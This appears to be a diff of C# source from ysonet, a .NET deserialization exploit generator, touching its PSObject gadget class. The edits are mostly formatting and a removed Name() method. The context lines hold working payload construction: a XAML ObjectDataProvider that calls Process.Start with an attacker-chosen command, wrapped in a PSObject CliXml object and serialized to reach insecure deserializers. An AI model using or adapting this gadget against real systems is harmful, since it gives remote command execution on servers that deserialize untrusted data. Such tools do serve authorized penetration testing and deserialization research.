@@ -1,10 +1,9 @@
 ﻿using System;
-using System.Runtime.Serialization;
 using System.Collections.Generic;
-using ysonet.Helpers;
-using System.Runtime.Serialization.Formatters.Binary;
-using System.Reflection;
 using System.IO;
+using System.Reflection;
+using System.Runtime.Serialization;
+using ysonet.Helpers;
 
 namespace ysonet.Generators
 {
@@ -32,10 +31,6 @@ namespace ysonet.Generators
 
     public class PSObjectGenerator : GenericGenerator
     {
-        public override string Name()
-        {
-            return "PSObject";
-        }
 
         public override string AdditionalInfo()
         {
@@ -46,15 +41,15 @@ namespace ysonet.Generators
         {
             return "Oleksandr Mirosh, Alvaro Munoz";
         }
-	
-	public override string Contributors()
+
+        public override string Contributors()
         {
             return "Alvaro Munoz";
         }
 
         public override List<string> Labels()
         {
-            return new List<string> { GadgetTypes.NotBridgeButDervied };
+            return new List<string> { };
         }
 
         public override List<string> SupportedFormatters()
@@ -67,12 +62,12 @@ namespace ysonet.Generators
             Assembly asm = Assembly.LoadFile(Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location) + @"\dlls\System.Management.Automation.dll");
 
             inputArgs.CmdType = CommandArgSplitter.CommandType.XML;
-            
+
             String cmdPart;
 
             if (inputArgs.HasArguments)
             {
-                cmdPart = $@"&lt;System:String&gt;"+ inputArgs.CmdFileName + @"&lt;/System:String&gt;
+                cmdPart = $@"&lt;System:String&gt;" + inputArgs.CmdFileName + @"&lt;/System:String&gt;
         &lt;System:String&gt;""" + inputArgs.CmdArguments + @""" &lt;/System:String&gt;";
             }
             else
@@ -110,7 +105,7 @@ namespace ysonet.Generators
   xmlns:Diag=""clr-namespace:System.Diagnostics;assembly=system""&gt;
 	 &lt;ObjectDataProvider x:Key="""" ObjectType = ""{ x:Type Diag:Process}"" MethodName = ""Start"" &gt;
      &lt;ObjectDataProvider.MethodParameters&gt;
-        "+ cmdPart + @"
+        " + cmdPart + @"
      &lt;/ObjectDataProvider.MethodParameters&gt;
     &lt;/ObjectDataProvider&gt;
 &lt;/ResourceDictionary&gt;
@@ -153,7 +148,7 @@ namespace ysonet.Generators
 
             PsObjectMarshal payload = new PsObjectMarshal(clixml);
 
-            if(inputArgs.Test)
+            if (inputArgs.Test)
                 serializationBinder = new LocalBinder(); // to use the vulnerable version when testing flag has been set
 
             return Serialize(payload, formatter, inputArgs);
